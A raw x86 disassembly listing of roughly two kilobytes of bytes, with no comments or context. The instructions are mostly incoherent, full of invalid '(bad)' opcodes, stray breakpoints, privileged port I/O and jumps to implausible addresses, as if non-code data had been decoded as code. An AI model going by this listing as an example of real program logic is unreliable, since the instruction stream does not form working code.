  41d0e2:	or     DWORD PTR [edx+0x0],ebp
  41d0e5:	stos   BYTE PTR es:[edi],al
  41d0e6:	int3   
  41d0e7:	fisttp WORD PTR [ebx+0x5101117c]
  41d0ed:	cmp    eax,0x915fcb7
  41d0f2:	xchg   ebx,eax
  41d0f3:	add    BYTE PTR ds:[eax+0x6c8bfbc4],ch
  41d0fa:	sub    DWORD PTR [ecx+0x16953138],eax
  41d100:	mov    esi,DWORD PTR [ecx+ebp*1-0x77]
  41d104:	push   ebp
  41d105:	sub    DWORD PTR [esi],eax
  41d107:	jns    0x45cafe89
  41d10d:	ror    DWORD PTR [esi+0x3200084b],1
  41d113:	ror    DWORD PTR [edi],1
  41d115:	mov    DWORD PTR [ebp+edx*1-0x17],ebp
  41d119:	pop    ss
  41d11a:	stos   BYTE PTR es:[edi],al
  41d11b:	mov    ah,0xdf
  41d11d:	mov    esi,esp
  41d11f:	adc    BYTE PTR [ecx],al
  41d121:	inc    edx
  41d122:	inc    ecx
  41d123:	nop
  41d124:	inc    ebx
  41d125:	hlt    
  41d126:	stos   BYTE PTR es:[edi],al
  41d127:	int3   
  41d128:	fisttp WORD PTR [ebx+0x110110fc]
  41d12e:	mov    eax,0xecc7ebb4
  41d133:	and    BYTE PTR [eax],al
  41d135:	add    BYTE PTR [ecx],dh
  41d137:	or     DWORD PTR [ecx+0x78869145],ecx
  41d13d:	adc    BYTE PTR [ecx],dh
  41d13f:	xchg   ebp,eax
  41d140:	or     al,0x8b
  41d142:	hlt    
  41d143:	sub    BYTE PTR [ecx+0x4953139],al
  41d149:	(bad)  
  41d14a:	in     al,dx
  41d14b:	and    bh,bh
  41d14d:	push   DWORD PTR [ecx]
  41d14f:	or     DWORD PTR [ecx+0x3a863d55],ecx
  41d155:	add    ch,al
  41d157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d158:	mov    BYTE PTR [ebp+0x3d],al
  41d15b:	mov    cs,WORD PTR [eax]
  41d15d:	adc    DWORD PTR [eax],0xb1000009
  41d163:	xchg   esp,eax
  41d164:	sbb    ecx,DWORD PTR [ebx+0x2891584]
  41d16a:	dec    esp
  41d16b:	sbb    bh,ch
  41d16d:	dec    DWORD PTR [esi+0x54d88b9]
  41d173:	mov    eax,0xfc00b5e7
  41d178:	sbb    ebp,edi
  41d17a:	sub    ebp,0x10
  41d17d:	xchg   DWORD PTR [ebp+0xd],eax
  41d180:	cs sbb al,0x8b
  41d183:	jl     0x41d19a
  41d185:	mov    DWORD PTR [edx],eax
  41d187:	stos   BYTE PTR es:[edi],al
  41d188:	retf   
  41d189:	pop    es
  41d18a:	lea    edi,[ebp+0x11]
  41d18d:	add    dl,BYTE PTR [edx-0x46]
  41d190:	ret    
  41d191:	sti    
  41d192:	push   eax
  41d193:	fnstenv [ecx-0x5]
  41d196:	(bad)  
  41d197:	mov    esi,0xa808c485
  41d19c:	ret    
  41d19d:	fisttp DWORD PTR [ebx+0x558914fc]
  41d1a3:	test   DWORD PTR [edi+0x14f48b0f],ecx
  41d1a9:	add    eax,0xf443902d
  41d1af:	mov    edx,0x7083ebcb
  41d1b4:	add    al,0x87
  41d1b6:	dec    ebp
  41d1b7:	lea    ebp,ds:0x28dc8b95
  41d1bd:	add    edx,0xe0539045
  41d1c3:	pop    eax
  41d1c4:	or     bh,ch
  41d1c6:	call   FWORD PTR [esi-0x73]
  41d1c9:	jecxz  0x41d228
  41d1cb:	jb     0x41d219
  41d1cd:	int3   
  41d1ce:	int3   
  41d1cf:	in     al,0x8d
  41d1d1:	in     al,dx
  41d1d2:	adc    DWORD PTR [ebp+0x10],0x68
  41d1d6:	lock xor ecx,ecx
  41d1d9:	(bad)  
  41d1da:	inc    BYTE PTR [eax]
  41d1dc:	sbb    al,0x9
  41d1de:	js     0x41d221
  41d1e0:	xor    DWORD PTR [edx+0x1599f843],eax
  41d1e6:	add    al,BYTE PTR [eax+0x31]
  41d1e9:	test   BYTE PTR [ebx-0x8],al
  41d1ec:	and    DWORD PTR [ecx],0x190efd3e
  41d1f2:	add    esp,0xfc438239
  41d1f8:	stos   BYTE PTR es:[edi],al
  41d1f9:	(bad)  
  41d1fa:	sqrtps xmm5,XMMWORD PTR [edx-0x45adf442]
  41d201:	into   
  41d202:	pop    es
  41d203:	push   eax
  41d204:	out    0xbe,al
  41d206:	sti    
  41d207:	mov    edx,esp
  41d209:	mov    dh,0xc0
  41d20b:	int3   
  41d20c:	in     eax,0x45
  41d20e:	int3   
  41d20f:	int3   
  41d210:	fs test ah,ch
  41d213:	mov    eax,ds:0x3e9165
  41d218:	test   DWORD PTR [ecx],0xbd1c8b68
  41d21e:	ja     0x41d261
  41d220:	xor    DWORD PTR [edx+0x4ce30150],eax
  41d226:	mov    BYTE PTR [eax+0x34],dl
  41d229:	mov    dh,0xc0
  41d22b:	int3   
  41d22c:	gs inc ebp
  41d22e:	int3   
  41d22f:	int3   
  41d230:	in     al,0x83
  41d232:	in     al,dx
  41d233:	adc    DWORD PTR [ebp-0x6af60fb],0xffffffc9
  41d23a:	dec    DWORD PTR [edx+0x3ec6dc63]
  41d240:	add    BYTE PTR [edx-0x7c74d037],bh
  41d246:	test   dl,dl
  41d248:	ds stos BYTE PTR es:[edi],al
  41d24a:	ror    DWORD PTR [ebx],0x8b
  41d24d:	add    DWORD PTR [edx-0x31450bb5],0xfffffff3
  41d254:	mov    edi,ecx
  41d256:	add    al,0x87
  41d258:	dec    ebp
  41d259:	cmp    DWORD PTR [ebx+edx*2-0x4415708],eax
  41d260:	mov    eax,0x930
  41d265:	lods   al,BYTE PTR ds:[esi]
  41d266:	dec    eax
  41d267:	je     0x41d2ad
  41d269:	mov    dl,0x95
  41d26b:	test   DWORD PTR [eax],0xc0310d9c
  41d271:	sbb    dl,ch
  41d273:	mov    BYTE PTR [ebp+0x9],cl
  41d276:	test   BYTE PTR [edi+0x18],cl
  41d279:	cmp    bh,BYTE PTR [esi-0x7be78af9]
  41d27f:	inc    ebx
  41d280:	clc    
  41d281:	mov    edx,0x79890bc5
  41d286:	cmc    
  41d287:	mov    BYTE PTR [ebp-0x27],dl
  41d28a:	add    DWORD PTR [ebx+0x10],0xffffffa8
  41d28e:	retf   0xb817
  41d291:	xor    BYTE PTR [ecx],cl
  41d293:	add    BYTE PTR [eax],al
  41d295:	(bad)  
  41d297:	mov    BYTE PTR [ebp-0x47],cl
  41d29a:	or     DWORD PTR [edi],0xffffff89
  41d29d:	pop    esp
  41d29e:	adc    DWORD PTR [ecx+0x42d3a945],ecx
  41d2a4:	cld    
  41d2a5:	add    BYTE PTR [ecx*1+0xc8ac031],bl
  41d2ac:	jmp    0x898b3564
  41d2b1:	in     eax,0xec
  41d2b3:	dec    ebx
  41d2b4:	int3   
  41d2b5:	int3   
  41d2b6:	jne    0x41d2fc
  41d2b8:	int3   
  41d2b9:	int3   
  41d2ba:	ins    DWORD PTR es:[edi],dx
  41d2bb:	inc    esp
  41d2bc:	int3   
  41d2bd:	int3   
  41d2be:	gs inc esp
  41d2c0:	int3   
  41d2c1:	int3   
  41d2c2:	add    al,0x84
  41d2c4:	in     al,dx
  41d2c5:	adc    DWORD PTR [ebp-0x10],0xffffffc4
  41d2c9:	inc    ebp
  41d2ca:	pop    ecx
  41d2cb:	or     BYTE PTR [eax],dh
  41d2cd:	add    BYTE PTR [ecx],dh
  41d2cf:	mov    eax,ds:0x8f10303
  41d2d4:	lahf   
  41d2d5:	cmp    al,0xc9
  41d2d7:	leave  
  41d2d8:	dec    DWORD PTR [edi+0x49]
  41d2db:	mov    ebx,0x8b36fffb
  41d2e0:	les    ecx,FWORD PTR [eax]
  41d2e2:	mov    eax,0x716af3cc
  41d2e7:	or     BYTE PTR [ebx-0x8],0x80
  41d2eb:	adc    BYTE PTR [ebx],0x1c
  41d2ee:	cdq    
  41d2ef:	enter  0x8aff,0x73
  41d2f3:	mov    ecx,0x16316a4f
  41d2f8:	push   ebx
  41d2f9:	hlt    
  41d2fa:	sar    ch,cl
  41d2fc:	ja     0x41d33f
  41d2fe:	xor    DWORD PTR [edx-0x3796ebc5],ecx
  41d304:	(bad)  
  41d305:	call   FWORD PTR [esi+ecx*1-0x48]
  41d309:	add    al,BYTE PTR [eax]
  41d30b:	xor    DWORD PTR [ecx],ecx
  41d30d:	add    bl,ch
  41d30f:	dec    ebx
  41d310:	or     BYTE PTR [ebx],0x0
  41d313:	xor    ecx,ecx
  41d315:	dec    DWORD PTR [eax+0x681974]
  41d31b:	inc    esi
  41d31c:	or     BYTE PTR [eax],al
  41d31e:	push   0x400b31
  41d323:	mov    edx,0xf07813fc
  41d328:	or     BYTE PTR [edi-0x3e],bh
  41d32b:	xor    DWORD PTR [ebx],ecx
  41d32d:	add    BYTE PTR [eax],al
  41d32f:	add    esp,DWORD PTR [ecx]
  41d331:	sahf   
  41d332:	dec    BYTE PTR [esi+0x35c48116]
  41d338:	push   ecx
  41d339:	add    BYTE PTR [edx],al
  41d33b:	icebp  
  41d33c:	or     BYTE PTR [ebx],ch
  41d33e:	add    BYTE PTR [ebx],dh
  41d340:	or     DWORD PTR [eax],eax
  41d342:	mov    edi,DWORD PTR [edi*8-0x1dcebe89]
  41d349:	(bad)  
  41d34a:	mov    DWORD PTR [ecx*8-0x7dcebe89],ebp
  41d351:	adc    eax,DWORD PTR [ecx+ecx*8-0x39]
  41d355:	call   DWORD PTR [ecx-0x70]
  41d358:	std    
  41d359:	ja     0x41d39c
  41d35b:	xor    DWORD PTR [ecx-0x47beb278],edi
  41d361:	out    0x9d,eax
  41d363:	sub    eax,0xed83fd16
  41d368:	add    al,0x89
  41d36a:	adc    eax,0x3e9145
  41d36f:	add    BYTE PTR [edx],dh
  41d371:	mov    esp,0x21648907
  41d376:	mov    DWORD PTR [ebp+0x19],edx
  41d379:	push   ss
  41d37a:	loop   0x41d307
  41d37c:	adc    al,0xb4
  41d37e:	ror    ah,0xe5
  41d381:	inc    esp
  41d382:	int3   
  41d383:	int3   
  41d384:	test   BYTE PTR [edx+0x16c8bec],al
  41d38a:	cmp    DWORD PTR [ebp+0x2d],eax
  41d38d:	call   0x5e9:0x16c8b04
  41d394:	fimul  DWORD PTR [ecx]
  41d396:	mov    DWORD PTR [ebp+0x35],eax
  41d399:	mov    ah,0xc0
  41d39b:	int3   
  41d39c:	in     eax,dx
  41d39d:	inc    esp
  41d39e:	int3   
  41d39f:	int3   
  41d3a0:	in     eax,0x44
  41d3a2:	int3   
  41d3a3:	int3   
  41d3a4:	add    al,0x82
  41d3a6:	in     al,dx
  41d3a7:	adc    DWORD PTR [ebp-0x62ba3b1c],0x8
  41d3ae:	nop
  41d3af:	add    DWORD PTR [ecx],esi
  41d3b1:	add    BYTE PTR [ebx+0x8],0xb8
  41d3b5:	retf   
  41d3b6:	xlat   BYTE PTR ds:[ebx]
  41d3b7:	mov    esi,esp
  41d3b9:	xor    BYTE PTR [ecx+0x4f0a2955],cl
  41d3bf:	cmp    al,0xa8
  41d3c1:	mov    ebx,0x28f48bdf
  41d3c6:	or     eax,0x88fcf9b7
  41d3cb:	push   ebp
  41d3cc:	push   ecx
  41d3cd:	add    DWORD PTR [edx+ecx*1+0x39],0xffffff80
  41d3d2:	inc    ebx
  41d3d3:	call   0x13eacd8
  41d3d8:	inc    eax
  41d3d9:	xor    DWORD PTR [edx-0x3846c3f5],eax
  41d3df:	call   DWORD PTR [eax+0x49]
  41d3e2:	(bad)  
  41d3e5:	cs mov esp,eax
  41d3e8:	or     BYTE PTR [eax+0x716aefce],bh
  41d3ee:	mov    eax,ds:0x9312fff
  41d3f3:	push   0xaa100
  41d3f8:	push   0x31
  41d3fa:	adc    al,0x53
  41d3fc:	lock test al,0xce
  41d3ff:	jecxz  0x41d38c
  41d401:	pop    esp
  41d402:	sub    DWORD PTR [ecx-0x77467abe],ecx
  41d408:	dec    ebp
  41d409:	cmp    DWORD PTR [edx-0x482aaa78],edi
  41d40f:	out    0xc1,eax
  41d411:	aam    0x14
  41d413:	std    
  41d414:	xor    ebp,0x5
  41d417:	lds    eax,FWORD PTR [ebp-0x43]
  41d41a:	or     DWORD PTR [eax],eax
  41d41c:	add    BYTE PTR [ecx],dh
  41d41e:	and    BYTE PTR [edi],al
  41d420:	mov    ebp,DWORD PTR [ebp+ebx*1-0x7f]
  41d424:	shl    BYTE PTR [eax],0x82
  41d427:	inc    ebx
  41d428:	hlt    
  41d429:	mov    edx,0xe60fdfc6
  41d42e:	mov    edx,0x1cfc3905
  41d433:	jno    0x41d48e
  41d435:	mov    edx,0x83e7ce
  41d43a:	or     ebp,edi
  41d43c:	push   DWORD PTR [ebx-0xc]
  41d43f:	jg     0x41d48c
  41d441:	call   0x5166f8
  41d446:	in     eax,0xd4
  41d448:	mov    BYTE PTR [ebp+0x59],dl
  41d44b:	add    BYTE PTR [edx+0x10],0xaa
  41d44f:	(bad)  
  41d450:	fisttp WORD PTR [ebx+0x448ad500]
  41d456:	and    DWORD PTR [ecx+ecx*4],edx
  41d459:	dec    ebp
  41d45a:	push   ecx
  41d45b:	fcom   st(1)
  41d45d:	test   eax,0x515588d4
  41d463:	add    al,0xad
  41d465:	inc    edx
  41d466:	ins    DWORD PTR es:[edi],dx
  41d467:	mov    ecx,0x80194588
  41d46c:	dec    ebx
  41d46d:	or     BYTE PTR [edx],dh
  41d46f:	rcl    DWORD PTR [ebx],0x51
  41d472:	stos   BYTE PTR es:[edi],al
  41d473:	mov    ebp,0x2d748be7
  41d478:	add    DWORD PTR [edx+0x35],eax
  41d47b:	mov    ecx,0x13fc55e7
  41d480:	std    
  41d481:	sub    ebp,0x4
  41d484:	mov    DWORD PTR [ebp-0x27],ecx
  41d487:	xchg   DWORD PTR [edi-0x183a47d8],edi
  41d48d:	jmp    0x41d452
  41d48f:	jg     0x41d4e4
  41d491:	in     al,0x83
  41d493:	and    DWORD PTR [esi],ecx
  41d495:	cld    
  41d496:	into   
  41d497:	adc    eax,DWORD PTR [ecx+0x23a12dc4]
  41d49d:	add    eax,DWORD PTR [eax]
  41d49f:	jno    0x41d4aa
  41d4a1:	lahf   
  41d4a2:	cmp    al,0x39
  41d4a4:	retf   0x4fff
  41d4a7:	cdq    
  41d4a8:	jg     0x41d4a4
  41d4aa:	jmp    DWORD PTR [esi-0x57f73b79]
  41d4b0:	int    0xdb
  41d4b2:	adc    DWORD PTR [ecx+edx*8+0x77],0x41
  41d4b7:	xor    DWORD PTR [ecx],ecx
  41d4b9:	jae    0x41d4c5
  41d4bb:	mov    edx,0xf0783005
  41d4c0:	or     BYTE PTR [edi-0x1],cl
  41d4c3:	fdiv   QWORD PTR [ecx+eax*4]
  41d4c6:	cmp    eax,0x3e9129
  41d4cb:	xor    DWORD PTR [esi-0x5f0e95e5],ebx
  41d4d1:	jmp    FWORD PTR [edi]
  41d4d3:	xor    DWORD PTR [ecx],ecx
  41d4d5:	mov    DWORD PTR [ebp+0x4d],edx
  41d4d8:	mov    dh,0x88
  41d4da:	inc    ebp
  41d4db:	push   ecx
  41d4dc:	jg     0x41d526
  41d4de:	xor    al,0xe0
  41d4e0:	adc    edx,DWORD PTR [ebx-0x10]
  41d4e3:	xchg   edx,eax
  41d4e4:	cld    
  41d4e5:	ja     0x41d528
  41d4e7:	xor    DWORD PTR [esi],ebx
  41d4e9:	adc    ebp,DWORD PTR [edx+0x71]
  41d4ec:	mov    eax,ds:0x9312fff
  41d4f1:	mov    DWORD PTR [ebp+0x15],edx
  41d4f4:	mov    eax,0xbd0e0069
  41d4f9:	out    dx,eax
  41d4fa:	mov    ds:0x3e911d,eax
  41d4ff:	mov    dl,0xd4
  41d501:	adc    edi,DWORD PTR [eax+0x0]
  41d504:	jo     0x41d50f
  41d506:	add    BYTE PTR [ebp+0x44],dh
  41d509:	lahf   
  41d50a:	aas    
  41d50b:	push   0xffffd931
  41d510:	stos   BYTE PTR es:[edi],al
  41d511:	int3   
  41d512:	sti    
  41d513:	push   eax
  41d514:	dec    ebx
  41d515:	or     ebp,edi
  41d517:	push   ebp
  41d518:	shl    DWORD PTR [esi+0x14],0x78
  41d51c:	jo     0x41d527
  41d51e:	mov    DWORD PTR [ebp-0x2b],ecx
  41d521:	or     BYTE PTR [ebx-0x28],0xaa
  41d525:	mov    esp,0x30f48bd7
  41d52a:	add    DWORD PTR [edx+0x65],eax
  41d52d:	add    BYTE PTR [ebx-0x20],0xaa
  41d531:	(bad)  
  41d532:	sti    
  41d533:	push   ecx
  41d534:	stos   BYTE PTR es:[edi],al
  41d535:	mov    esp,0xfdd052e3
  41d53a:	ja     0x41d57d
  41d53c:	xor    DWORD PTR [ecx+0x127d95e7],edi
  41d542:	std    
  41d543:	sub    DWORD PTR [ebp+0x5],0xffffff89
  41d547:	dec    ebp
  41d548:	push   ecx
  41d549:	xchg   BYTE PTR [edi+0x931a4],dh
  41d54f:	add    ch,ah
  41d551:	into   
  41d552:	mov    BYTE PTR [ebp+0x51],dl
  41d555:	jle    0x41d59a
  41d557:	fdiv   DWORD PTR [edx]
  41d559:	xchg   DWORD PTR [eax-0x78f6cf00],esp
  41d55f:	inc    ebp
  41d560:	dec    ebp
  41d561:	jle    0x41d5ae
  41d563:	loopne 0x41d50f
  41d565:	cld    
  41d566:	adc    edi,DWORD PTR [eax+0x0]
  41d569:	jo     0x41d574
  41d56b:	sub    DWORD PTR [ecx+0x5d],edx
  41d56e:	adc    BYTE PTR [ebx],0x44
  41d571:	cdq    
  41d572:	enter  0xa0ff,0x6d
  41d576:	xchg   ecx,eax
  41d577:	add    BYTE PTR ds:[ecx+0x7e],ah
  41d57b:	or     edx,DWORD PTR [ecx+ecx*4]
  41d57e:	enter  0x50ff,0xaa
  41d582:	mov    ebx,0x920952eb
  41d587:	stc    
  41d588:	(bad)  
  41d589:	out    dx,al
  41d58a:	test   esp,eax
  41d58c:	or     al,0xba
  41d58e:	retf   
  41d58f:	fisttp WORD PTR [ebx+0x4177fd2c]
  41d595:	xor    DWORD PTR [esi],eax
  41d597:	dec    eax
  41d598:	sub    BYTE PTR [eax+0x70785403],bh
  41d59e:	or     DWORD PTR [ecx+0x3e90f93d],eax
  41d5a4:	add    BYTE PTR [ecx],dh
  41d5a6:	pushf  
  41d5a7:	sub    cl,BYTE PTR [ebx+0x4177fd44]
  41d5ad:	xor    DWORD PTR [edi-0x37e6ab62],esi
  41d5b3:	dec    DWORD PTR [edi-0x56]
  41d5b6:	add    esi,DWORD PTR [eax]
  41d5b8:	js     0x41d5aa
  41d5ba:	or     BYTE PTR [edi-0x18],cl
  41d5bd:	or     DWORD PTR ds:0x4cb2fffd,edx
  41d5c3:	or     al,0x8b
  41d5c5:	sbb    al,0xfd
  41d5c7:	ja     0x41d60a
  41d5c9:	xor    DWORD PTR [edi+0x680049e7],esi
  41d5cf:	adc    ebp,edi
  41d5d1:	xor    DWORD PTR [ebp+0xc],0xffffffe9
  41d5d5:	popa   
  41d5d6:	leave  
  41d5d7:	fadd   QWORD PTR [eax]
  41d5d9:	inc    eax
  41d5da:	xor    DWORD PTR [eax+0x3c],ebp
  41d5dd:	js     0x41d5cf
  41d5df:	or     BYTE PTR [eax-0x18],dl
  41d5e2:	in     eax,0xf
  41d5e4:	std    
  41d5e5:	push   DWORD PTR [edx+0x7489084c]
  41d5eb:	xor    eax,0x913d0d89
  41d5f0:	add    BYTE PTR ds:[eax-0x2f1fac7c],al
  41d5f7:	cmc    
  41d5f8:	ja     0x41d63b
  41d5fa:	xor    DWORD PTR [edx+eax*2],ecx
  41d5fd:	sub    BYTE PTR [ecx-0x7c],ah
  41d600:	or     esi,DWORD PTR [eax]
  41d602:	jns    0x41d5ce
  41d604:	call   DWORD PTR [eax+0x9]
  41d607:	loope  0x41d604
  41d609:	(bad)  
  41d60a:	out    dx,al
  41d60b:	mov    esp,es
  41d60d:	or     al,0xba
  41d60f:	imul   BYTE PTR [edi]
  41d611:	js     0x41d683
  41d613:	or     DWORD PTR [edi-0x3e],edi
  41d616:	rcl    DWORD PTR [esi-0x9470002],0x5b
  41d61d:	js     0x41d68f
  41d61f:	or     DWORD PTR [ebx+0x69b9b945],ecx
  41d625:	inc    eax
  41d626:	dec    ebx
  41d627:	pop    es
  41d628:	mov    DWORD PTR ds:0x3e910d,ecx
  41d62e:	add    BYTE PTR [eax],dl
  41d630:	push   ebx
  41d631:	aam    0x0
  41d633:	mov    DWORD PTR [ecx+edi*8],ebp
  41d636:	call   DWORD PTR [esi+0x31ffff51]
  41d63c:	or     DWORD PTR [ecx+0x44ae4e5],ecx
  41d642:	add    BYTE PTR [ebp+0x3d],ch
  41d645:	int3   
  41d646:	int3   
  41d647:	gs cmp eax,0x8404cccc
  41d64d:	in     al,dx
  41d64e:	mov    ebp,esp
  41d650:	add    BYTE PTR [ecx-0x3f51a2c0],cl
  41d656:	int3   
  41d657:	gs cmp eax,0x83e4cccc
  41d65d:	in     al,dx
  41d65e:	push   ebx
  41d65f:	fbstp  TBYTE PTR [edi-0x6eeec278]
  41d665:	add    BYTE PTR ds:[edx+0x70782bee],ch
  41d66c:	or     DWORD PTR [ecx+0x3e914935],ecx
  41d672:	add    BYTE PTR [esi-0x51],bh
  41d675:	pop    eax
  41d676:	pop    ebp
  41d677:	repnz cmp al,0xcc
  41d67a:	int3   
  41d67b:	fs test ah,ch
  41d67e:	push   ecx
  41d67f:	cdq    
  41d680:	lds    eax,FWORD PTR [eax]
  41d682:	inc    eax
  41d683:	xor    DWORD PTR [edx+0x3c],ebp
  41d686:	js     0x41d6f8
  41d688:	or     DWORD PTR [eax-0x18],edx
  41d68b:	popf   
  41d68c:	adc    ch,bh
  41d68e:	push   DWORD PTR [edx+0x74890844]
  41d694:	or     eax,0x29004d89
  41d699:	mov    edx,0xf5ba0069
  41d69e:	push   edi
  41d69f:	js     0x41d711
  41d6a1:	or     DWORD PTR [edx-0x1],edx
  41d6a4:	fs or  eax,0x4c54e589
  41d6aa:	int3   
  41d6ab:	int3   
  41d6ac:	add    al,0x84
  41d6ae:	in     al,dx
  41d6af:	adc    DWORD PTR [ebp-0x66ba3b1c],0x8
  41d6b6:	add    BYTE PTR [eax],al
  41d6b8:	xor    DWORD PTR [eax+0x43],ecx
  41d6bb:	fmul   QWORD PTR [ecx]
  41d6bd:	or     DWORD PTR [eax],eax
  41d6bf:	add    BYTE PTR [esi-0x3b],ch
  41d6c2:	repz add DWORD PTR [ecx],esi
  41d6c5:	or     DWORD PTR [eax],eax
  41d6c7:	(bad)  
  41d6c8:	in     al,dx
  41d6c9:	or     al,0x0
  41d6cb:	add    BYTE PTR [ecx],dh
  41d6cd:	or     ebp,eax
  41d6cf:	inc    ebp
  41d6d0:	dec    ebp
  41d6d1:	or     BYTE PTR [eax],al
  41d6d3:	add    BYTE PTR [ecx],dh
  41d6d5:	test   BYTE PTR [ebx+0x8],cl
  41d6d8:	test   al,0xfd
  41d6da:	das    
  41d6db:	js     0x41d6cd
  41d6dd:	or     al,ch
  41d6df:	test   eax,0xa1fd0f3e
  41d6e4:	add    DWORD PTR [ecx+0x100c003e],edx
  41d6ea:	std    
  41d6eb:	add    BYTE PTR [ecx],dh
  41d6ed:	xchg   ebp,eax
  41d6ee:	or     eax,edi
  41d6f0:	sub    al,0xd1
  41d6f2:	ja     0x41d735
  41d6f4:	xor    DWORD PTR [ecx],ecx
  41d6f6:	add    BYTE PTR [eax],al
  41d6f8:	xor    DWORD PTR [edx],esp
  41d6fa:	or     al,bh
  41d6fc:	add    BYTE PTR [ecx+edx*8],dh
  41d6ff:	ja     0x41d742
  41d701:	xor    DWORD PTR [eax],ecx
  41d703:	add    BYTE PTR [eax],al
  41d705:	xor    DWORD PTR [edx-0x3786cfc5],ecx
  41d70b:	(bad)  
  41d70c:	jmp    DWORD PTR [ebx+eax*1-0x3b]
  41d710:	add    eax,0x3e9129
  41d715:	xor    DWORD PTR [ecx],ecx
  41d717:	add    BYTE PTR [eax],al
  41d719:	mov    dl,0xcc
  41d71b:	aaa    
  41d71c:	js     0x41d78e
  41d71e:	or     DWORD PTR [eax],eax
  41d720:	jne    0x41d756
  41d722:	mov    ds:0x924feff,eax
  41d727:	js     0x41d76a
  41d729:	xor    DWORD PTR [edx+0x30],ebp
  41d72c:	js     0x41d71e
  41d72e:	or     BYTE PTR [ecx+0x3e91610d],cl
  41d734:	add    BYTE PTR [eax+0x3c8be7bc],ch
  41d73a:	fnstenv [edi+0x41]
  41d73d:	xor    DWORD PTR [edx-0x34cd17bd],eax
  41d743:	cmp    ecx,DWORD PTR [ecx+0x4d8920f4]
  41d749:	mov    DWORD PTR [eax-0x3816e3f5],eax
  41d74f:	jmp    DWORD PTR [edi+0x1]
  41d752:	or     al,BYTE PTR [eax+0x0]
  41d755:	pop    esi
  41d756:	hlt    
  41d757:	push   DWORD PTR [edi-0x10]
  41d75a:	or     BYTE PTR [ecx-0x3836c4],ah
  41d760:	mov    BYTE PTR [eax],0x2c
  41d763:	mov    ebp,0x94314177
  41d768:	add    BYTE PTR [eax+0x31],al
  41d76b:	mov    eax,ds:0x971035f
  41d770:	mov    DWORD PTR ds:0x3e9165,edx
  41d776:	and    DWORD PTR [ecx],0xffffffc2
  41d779:	not    DWORD PTR [esi]
  41d77b:	push   cs
  41d77c:	add    esp,0x78486a39
  41d782:	jo     0x41d78d
  41d784:	std    
  41d785:	adc    eax,0x3e9169
  41d78a:	shl    BYTE PTR [eax+0x68314177],cl
  41d790:	dec    esp
  41d791:	js     0x41d803
  41d793:	or     DWORD PTR [eax-0x18],edx
  41d796:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d797:	push   cs
  41d798:	std    
  41d799:	push   DWORD PTR [edx+0x74890444]
  41d79f:	sbb    DWORD PTR [ecx-0x18483eb3],ecx
  41d7a5:	aad    0xbf
  41d7a7:	or     eax,0x4ed83fd
  41d7ac:	mov    eax,ds:0xffc82934
  41d7b1:	mov    bh,ah
  41d7b3:	sbb    BYTE PTR [edx+0x6a],dl
  41d7b6:	xor    DWORD PTR [eax+0x34],ebp
  41d7b9:	js     0x41d7ab
  41d7bb:	or     BYTE PTR [eax-0x18],dl
  41d7be:	lods   eax,DWORD PTR ds:[esi]
  41d7bf:	adc    eax,0x44b2fffd
  41d7c4:	or     al,0x8b
  41d7c6:	add    ah,ch
  41d7c8:	sbb    BYTE PTR [edi+0x5381914d],al
  41d7ce:	cld    
  41d7cf:	sub    dh,BYTE PTR [edi+ebp*8+0x43820b73]
  41d7d6:	loopne 0x41d7d9
  41d7d8:	or     BYTE PTR [ebx-0x24],0x0
  41d7dc:	and    DWORD PTR [esi-0x7ef2b105],ebp
  41d7e2:	les    edi,FWORD PTR [ecx]
  41d7e4:	push   0x40
  41d7e6:	js     0x41d7d8
  41d7e8:	or     BYTE PTR [ecx+0x3e90f115],cl
  41d7ee:	add    BYTE PTR [ebx+0x70784c6a],al
  41d7f4:	or     DWORD PTR [ecx],eax
  41d7f6:	inc    ebp
  41d7f7:	adc    eax,0x5d0d88ba
  41d7fc:	xchg   ecx,eax
  41d7fd:	add    BYTE PTR ds:[edx],dh
  41d800:	mov    esi,0x351951fb
  41d805:	idiv   edi
  41d807:	dec    BYTE PTR [eax-0x4955f33c]
  41d80d:	repz add eax,DWORD PTR [ebp+ebp*1-0x7d32aaff]
  41d815:	push   ebx
  41d816:	in     al,0xaa
  41d818:	(bad)  
  41d819:	sti    
  41d81a:	add    ebp,DWORD PTR [ebp+ebp*1-0x79]
  41d81e:	inc    ebp
  41d81f:	int    0x80
  41d821:	dec    ebx
  41d822:	loopne 0x41d83e
  41d824:	(bad)  
  41d825:	aas    
  41d826:	js     0x41d898
  41d828:	or     DWORD PTR [edi+0x20d1004d],eax
  41d82e:	sahf   
  41d82f:	(bad)  
  41d830:	hlt    
  41d831:	adc    BYTE PTR [eax],al
  41d833:	add    BYTE PTR [ecx],dh
  41d835:	or     ecx,ebp
  41d837:	or     DWORD PTR [edx+0x7383f7b6],ebp
  41d83d:	add    eax,0x80895587
  41d842:	inc    ebx
  41d843:	clc    
  41d844:	dec    edx
  41d845:	(bad)  
  41d846:	out    dx,eax
  41d847:	jae    0x41d882
  41d849:	or     BYTE PTR [ebx],0x34
  41d84c:	stc    
  41d84d:	leave  
  41d84e:	inc    DWORD PTR [edx]
  41d850:	cld    
  41d851:	adc    BYTE PTR [ecx-0x849cdef],cl
  41d857:	mov    eax,ds:0x3e9125
  41d85c:	xor    al,dh
  41d85e:	test   DWORD PTR [ecx-0x7b47fdf],0x3e74ab0
  41d868:	xor    DWORD PTR [ecx],ecx
  41d86a:	mov    DWORD PTR ds:0x3e90fd,edx
  41d870:	xor    dh,BYTE PTR [esi+0x6a3b33f7]
  41d876:	xor    al,0x78
  41d878:	jo     0x41d883
  41d87a:	add    DWORD PTR [ebp+0x19],eax
  41d87d:	or     BYTE PTR [eax],0xeb
  41d880:	mov    BYTE PTR [ecx-0x3576dbd5],0xff
  41d887:	mov    BYTE PTR [ecx+ebp*8],bh
  41d88a:	ja     0x41d8cd
  41d88c:	xor    eax,ebx
  41d88e:	(bad)  
  41d88f:	mov    DWORD PTR [eax],eax
  41d891:	and    al,0xf1
  41d893:	ja     0x41d8d6
  41d895:	xor    eax,ebx
  41d897:	(bad)  
  41d898:	mov    DWORD PTR [ebx*8+0x21314177],edi
  41d89f:	dec    esi
  41d8a0:	test   esi,0x960d8b0b
  41d8a6:	xchg   ebx,eax
  41d8a7:	add    BYTE PTR ds:[eax+0x31b9f7bd],ch
  41d8ae:	pop    es
  41d8af:	inc    eax
  41d8b0:	add    BYTE PTR [eax+0x31020021],dh
  41d8b6:	or     DWORD PTR [ecx-0x312066ab],ecx
  41d8bc:	mov    DWORD PTR [ecx+eiz*8],edi
  41d8bf:	ja     0x41d902
